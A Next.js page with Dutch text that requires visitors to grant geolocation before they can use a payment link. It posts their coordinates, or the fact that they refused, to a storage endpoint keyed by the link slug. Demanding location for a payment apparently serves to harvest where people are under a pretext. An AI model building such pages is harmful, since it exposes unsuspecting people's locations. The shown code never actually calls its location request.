import { useEffect, useState } from 'react';

export async function getServerSideProps({ params }) {
  return { props: { slug: params.slug } };
}

export default function Verify({ slug }) {
  const [error, setError] = useState(false);

  const logDenied = async () => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        slug,
        denied: true,
      }),
    });
  };

  const requestLocation = () => {
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await fetch('/api/store-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            slug,
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          }),
        });

        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        setError(true);
        await logDenied(); // ✅ HIER de nieuwe logging
      }
    );
  };

  useEffect(() => {
    // ❗ niet automatisch vragen op iOS
  }, []);

  return (
    <div style={{ padding: '2rem', fontFamily: 'sans-serif', textAlign: 'center' }}>
      <h1>🇳🇱 Nederlands?</h1>

      <p>
        Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
      </p>

      {error && (
        <p style={{ color: 'red', marginTop: '1rem' }}>
          Locatie is verplicht om verder te gaan.
        </p>
      )}
    </div>
  );
}
